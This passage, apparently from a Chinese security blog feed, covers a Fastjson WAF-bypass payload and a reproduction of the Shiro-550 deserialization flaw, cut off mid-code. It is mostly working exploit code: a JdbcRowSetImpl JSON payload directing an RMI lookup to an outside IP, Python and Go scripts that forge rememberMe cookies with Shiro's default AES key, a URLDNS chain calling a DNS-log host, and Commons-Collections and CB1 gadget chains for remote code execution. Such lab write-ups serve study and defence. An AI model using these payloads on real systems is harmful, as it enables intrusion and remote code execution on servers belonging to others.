class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>183<br><br><span class="language-elixir">&#123;</span><br><span class="language-elixir">    <span class="hljs-string">&quot;b&quot;</span><span class="hljs-symbol">:</span>&#123;</span><br><span class="language-elixir"> /*&#123;*/</span><br><span class="language-elixir">/*&#125;*/<span class="hljs-string">&quot;@type&quot;</span><span class="hljs-symbol">:/*shabiwafwocaonima*/xcom</span>.sun.rowset.<span class="hljs-title class_">JdbcRowSetImpl</span><span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-elixir"> &quot;</span>dat____aSourceName<span class="hljs-string">&quot;:&quot;</span><span class="hljs-symbol">rmi:</span>//<span class="hljs-number">121.37</span>.<span class="hljs-number">229.215</span><span class="hljs-symbol">:</span><span class="hljs-number">9999</span>/<span class="hljs-title class_">Calc</span><span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-elixir">        &quot;</span>autoCommit<span class="hljs-string">&quot;:true</span></span><br><span class="hljs-string"><span class="language-elixir">    &#125;</span></span><br><span class="hljs-string"><span class="language-elixir">&#125;</span></span><br></code></pre></td></tr></table></figure><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/#%E6%B3%A8%E9%87%8A%E5%8A%A0%E5%BC%BA%E7%89%88%E7%BB%95%E8%BF%87">浅谈Fastjson绕waf (y4tacker.github.io)</a></p><p><a href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/">Java反序列化Fastjson篇01-FastJson基础 | Drunkbaby’s Blog (drun1baby.top)</a></p><p><a href="https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Java反序列化Fastjson篇02-Fastjson-1.2.24版本漏洞分析 | Drunkbaby’s Blog (drun1baby.top)</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>fastjson</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shiro550</title>
    <link href="/2024/04/21/shiro550/"/>
    <url>/2024/04/21/shiro550/</url>
    
    <content type="html"><![CDATA[<h1 id="环境配置："><a href="#环境配置：" class="headerlink" title="环境配置："></a>环境配置：</h1><p><a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p><p>在samples目录下的web目录，才是我们需要复现的环境。</p><p>将<code>jstl</code>版本改成1.2</p><p><img src="/./../../public/blog_image/image-20240326093120423.png" alt="&lt;!--image-20240326093120423--&gt;"></p><p>shiro版本：1.2.4</p><h1 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h1><p>访问页面抓包：</p><p><a href="http://localhost:8081/login.jsp">localhost:8081&#x2F;login.jsp</a>后点击记住我：</p><p>返回数据包：</p><p><img src="/./../../public/blog_image/image-20240326155054935.png" alt="image-20240326155054935"></p><p>之后我们的后端就根据这个cookie去获取数据，之后我们的每次请求都会带上这个cookie。</p><p>这个cookie如何生成，并且如何利用就是shiro550的利用点。</p><h2 id="cookie解密："><a href="#cookie解密：" class="headerlink" title="cookie解密："></a>cookie解密：</h2><p>cookie的生成都在<code>CookieRememberMeManager</code></p><p><code>rememberSerializedIdentity</code>一看就是传入subject授权对象，然后进行进行序列化。</p><p><img src="/./../../public/blog_image/image-20240326160510636.png" alt="image-20240326160510636"></p><p>找到了一个get序列化值：</p><p><img src="/./../../public/blog_image/image-20240326160659957.png" alt="image-20240326160659957"></p><p>可以查看这个<code>getRememberedSerializedIdentity</code>方法哪里有调用，在<code>AbstractRememberMeManager</code>中调用了，如图所示：</p><p><img src="/./../../public/blog_image/image-20240326160940917.png" alt="image-20240326160940917"></p><p>可以知道获取到这个remeber序列化的标识后传给了<code>convertBytesToPrincipals</code>，这个方法一看就是对结果进行授权的，跟进查看：</p><p><img src="/./../../public/blog_image/image-20240326161046773.png" alt="image-20240326161046773"></p><p>首先对数据进行了<code>decrypt</code>解密，然后调用了反序列化。</p><p>查看解密函数：</p><p><img src="/./../../public/blog_image/image-20240326161133442.png" alt="image-20240326161133442"></p><p>这里解密需要解密的key，查看<code>getDecryptionCipherKey</code>函数：</p><p><img src="/./../../public/blog_image/image-20240326161254603.png" alt="image-20240326161254603"></p><p>查看<code>decryptionCipherKey</code>这个byte数组哪里赋值的，一直追踪发现是在抽象类中定义的全局变量：<br><img src="/./../../public/blog_image/image-20240326161350865.png" alt="image-20240326161350865"></p><p>然后返回<code>convertBytesToPrincipals</code>函数，最终调用了原生的反序列化：</p><p><img src="/./../../public/blog_image/image-20240326161659630.png" alt="image-20240326161659630"></p><h2 id="cookie加密："><a href="#cookie加密：" class="headerlink" title="cookie加密："></a>cookie加密：</h2><p>在<code>JcaCipherService.java</code>的<code>encrypt</code>方法。</p><p>主要是使用了aes加密算法。</p><p>这里就不贴了，我们根据默认key就可以去构造对应的恶意数据。</p><h1 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h1><h2 id="URLDNS链："><a href="#URLDNS链：" class="headerlink" title="URLDNS链："></a>URLDNS链：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br>    <span class="hljs-keyword">return</span> ciphertext<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    data = get_file_data(<span class="hljs-string">&quot;D:\Language\Java\java_code\Security\s.bin&quot;</span>)<br>    <span class="hljs-built_in">print</span>(aes_enc(data))<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;bytes&quot;</span><br>    <span class="hljs-string">&quot;crypto/aes&quot;</span><br>    <span class="hljs-string">&quot;crypto/cipher&quot;</span><br>    <span class="hljs-string">&quot;crypto/rand&quot;</span><br>    <span class="hljs-string">&quot;encoding/base64&quot;</span><br>    <span class="hljs-string">&quot;io/ioutil&quot;</span><br>    <span class="hljs-string">&quot;log&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getFileData</span><span class="hljs-params">(filename <span class="hljs-type">string</span>)</span></span> []<span class="hljs-type">byte</span> &#123;<br>    data, err := ioutil.ReadFile(filename)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       log.Fatalf(<span class="hljs-string">&quot;Failed to read file: %v&quot;</span>, err)<br>    &#125;<br>    <span class="hljs-keyword">return</span> data<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">pad</span><span class="hljs-params">(src []<span class="hljs-type">byte</span>)</span></span> []<span class="hljs-type">byte</span> &#123;<br>    blockSize := aes.BlockSize<br>    padding := blockSize - <span class="hljs-built_in">len</span>(src)%blockSize<br>    padtext := bytes.Repeat([]<span class="hljs-type">byte</span>&#123;<span class="hljs-type">byte</span>(padding)&#125;, padding)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">append</span>(src, padtext...)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">encryptAES</span><span class="hljs-params">(data []<span class="hljs-type">byte</span>)</span></span> []<span class="hljs-type">byte</span> &#123;<br>    key, err := base64.StdEncoding.DecodeString(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       log.Fatalf(<span class="hljs-string">&quot;Failed to decode key: %v&quot;</span>, err)<br>    &#125;<br><br>    block, err := aes.NewCipher(key)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       log.Fatalf(<span class="hljs-string">&quot;Failed to create cipher block: %v&quot;</span>, err)<br>    &#125;<br><br>    paddedData := pad(data)<br><br>    ciphertext := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, aes.BlockSize+<span class="hljs-built_in">len</span>(paddedData))<br>    iv := ciphertext[:aes.BlockSize]<br>    <span class="hljs-keyword">if</span> _, err := rand.Read(iv); err != <span class="hljs-literal">nil</span> &#123;<br>       log.Fatalf(<span class="hljs-string">&quot;Failed to generate IV: %v&quot;</span>, err)<br>    &#125;<br><br>    mode := cipher.NewCBCEncrypter(block, iv)<br>    mode.CryptBlocks(ciphertext[aes.BlockSize:], paddedData)<br><br>    <span class="hljs-keyword">return</span> ciphertext<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    data := getFileData(<span class="hljs-string">&quot;D:/Language/Java/java_code/Security/s.bin&quot;</span>)<br>    encryptedData := encryptAES(data)<br>    encodedData := base64.StdEncoding.EncodeToString(encryptedData)<br>    log.Println(encodedData)<br>&#125;<br></code></pre></td></tr></table></figure><p>java中的urldns链代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;URL, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://etcymwhewz.dgrh3.cn&quot;</span>);<br>        <span class="hljs-comment">// put方法会调用hashCode方法 最终会调用hashCode方法</span><br>        <span class="hljs-comment">// url的hashCode方法中会判断hashCode是否为-1 如果不为-1则直接返回 默认为-1</span><br>        <span class="hljs-comment">// 因此这里需要修改hashCode方法 让他直接返回 而不是调用其他方法去执行dns解析</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCodeFiled</span> <span class="hljs-operator">=</span> url.getClass().getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashCodeFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        hashCodeFiled.set(url, <span class="hljs-number">123456</span>);<br><br>        <span class="hljs-comment">// 修改后put就不会执行dns解析了</span><br>        map.put(url, <span class="hljs-string">&quot;shabi&quot;</span>);<br>        <span class="hljs-comment">// 修改回去让反序列化时执行dns请求</span><br>        hashCodeFiled.set(url, -<span class="hljs-number">1</span>);<br><br>        SerializeUtil.serialize(map);<br>    &#125;<br></code></pre></td></tr></table></figure><p>之后执行加密即可：</p><p>这里需要删除<code>JSESSION</code>才可以，因为这个是没有rememberMe，有这个字段也会认为当前用户是保持登陆状态。</p><p><img src="/./../../public/blog_image/image-20240326175629137.png" alt="image-20240326175629137"></p><p>看到deleteMe即可，查看dns：</p><p><img src="/./../../public/blog_image/image-20240326175643874.png" alt="image-20240326175643874"></p><h2 id="CC3-2-1版本："><a href="#CC3-2-1版本：" class="headerlink" title="CC3.2.1版本："></a>CC3.2.1版本：</h2><p>导入依赖：</p><p><img src="/./../../public/blog_image/image-20240331105150644.png" alt="image-20240331105150644"></p><p>如何我们直接使用Common-Collections3.2.1的第六条链路cc6的exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 创建一个runtime示例 ==》 调用Runtime.getRuntime()</span><br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;hello&quot;</span>));<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; expHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">// put方法会执行getValue方法</span><br>        expHashMap.put(tiedMapEntry, <span class="hljs-string">&quot;sdfdsf&quot;</span>);<br><br>        <span class="hljs-comment">// 删除key 目的为了反序列化的时候走factory.transform(key);</span><br>        map.remove(<span class="hljs-string">&quot;key&quot;</span>);<br><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap,factory);<br><br><span class="hljs-comment">//        SerializeUtil.serialize(expHashMap);</span><br>        SerializeUtil.unSerialize();<br>    &#125;<br></code></pre></td></tr></table></figure><p>发现打不进去找不到<code>Transformer</code>数组。</p><p><img src="/./../../public/blog_image/image-20240331110104826.png" alt="image-20240331110104826"></p><p>我们看一下shiro550中的<code>deserialize</code>方法是如何反序列化的，其实它是调用了<code>ClassResolvingObjectInputStream</code>的<code>readObject</code>方法。</p><p><img src="/./../../public/blog_image/image-20240331110343105.png" alt="image-20240331110343105"></p><p>查看这个类，只定义了两个方法：</p><p><img src="/./../../public/blog_image/image-20240331110512868.png" alt="image-20240331110512868"></p><p>其中重写了<code>resolveClass</code>。这里说明以下，调用<code>readObejct</code>会先调用<code>resolveClass</code>方法，如果是重写了则会调用重写的方法。</p><p>然后跟进调用了这个工具类的<code>forName</code>方法。</p><p><img src="/./../../public/blog_image/image-20240331110630129.png" alt="image-20240331110630129"></p><p>查看注释可以看到这个函数主要是作用是<code>loadClass</code>，首先查询当前线程是否能加载该类，如果不能的话则调用<code>system/application</code>的加载器，如果在没有的话则直接抛出异常。</p><p>查看原生的<code>ObjectInputStream</code>的<code>resolveClass</code>方法：</p><p><img src="/./../../public/blog_image/image-20240331111046190.png" alt="image-20240331111046190"></p><p>所以说shiro中的<code>readObejct</code>方法是不能读取数组类，而原生的是可以的。</p><p>因此我们需要构造一个没有数组的调用链。</p><p>因此我们不用cc1了，因为这个是一定要有Transformer去控制我们传入的参数执行<code>Runtime</code>代码，我们可以尝试使用cc3，因为cc6调用的是一个map的key的<code>getVaule</code>方法。最终我们不需要<code>Runtime</code>加载恶意指令了，而是调用<code>Templates</code>加载字节码。</p><p>这里也可以调用cc4。</p><p><img src="/./../../public/blog_image/image-20240331111730054.png" alt="image-20240331111730054"></p><p>所以说后半段都是调用<code>TemplatesImpl</code>类。</p><p>完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>    setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>    setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>    setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>    <span class="hljs-comment">// 构造cc3后半段 去调用TemplatesImpl#newTransformer方法</span><br>    <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>    <span class="hljs-comment">// cc6</span><br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;hello&quot;</span>));<br><br>    <span class="hljs-comment">// 传入lazyMap 和 对应的key 这个key后面需要移除</span><br>    <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, templates);<br><br>    HashMap&lt;Object, Object&gt; expHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <span class="hljs-comment">// put方法会执行getValue方法</span><br>    expHashMap.put(tiedMapEntry, <span class="hljs-string">&quot;sdfdsf&quot;</span>);<br><br>    <span class="hljs-comment">// 删除key 目的为了反序列化的时候走factory.transform(key); --&gt; 这里就是</span><br>    map.remove(templates);<br><br>    Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>    factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>    factoryField.set(lazyMap, invokerTransformer);<br><br>    SerializeUtil.serialize(expHashMap);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(TemplatesImpl templates, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> templates.getClass().getDeclaredField(filedName);<br>    declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>    declaredField.set(templates, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要逻辑是调用了put方法，然后会调用<code>tiedMapEntry</code>的hash方法，最终会调用<code>getVaule</code>方法。</p><p><code>getVaule</code>方法中会调用<code>get</code>方法。由于我们传入的<code>TiedMapEntry</code>的key是<code>LazyMap</code>，<code>TiedMapEntry</code>的<code>getVaule</code>会调用<code>LazyMap</code>的<code>get</code>方法。</p><p><code>LazyMap</code>中的<code>factory</code>是我们传入的<code>InvokerTransformer</code>，因此会调用对应的<code>transform</code>方法，该形参<code>key</code>是<code>TemplatesImpl</code>。<br><img src="/./../../public/blog_image/image-20240331114429582.png" alt="image-20240331114429582"></p><p>因此最终会调用到<code>InvokerTransformer</code>的<code>transform</code>方法，这个方法很熟悉了，就是我们需要调用的<code>TemplatesImple</code>的<code>newTransformer</code>。这个方法最终会调用到<code>TemplatesImple</code>的<code>defineClass</code>方法。从而造成了加载恶意class。</p><p><img src="/./../../public/blog_image/image-20240331114611127.png" alt="image-20240331114611127"></p><p>调用流程如图所示：</p><p><img src="/./../../public/blog_image/image-20240331140415657.png" alt="image-20240331140415657"></p><h2 id="CB1-原生链："><a href="#CB1-原生链：" class="headerlink" title="CB1 原生链："></a>CB1 原生链：</h2><p>CB链不用我多说了，PropertyUtils.getProperty会反射调用对应的get方法，和fastjson一样。然后我们需要找的哪个类调用了<code>getProperty</code>。</p><p>在java中的原生类消息队列<code>PriorityQueue</code>的compare会调用<code>getProperty</code>方法。</p><p>poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>    setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>    setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>    setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title 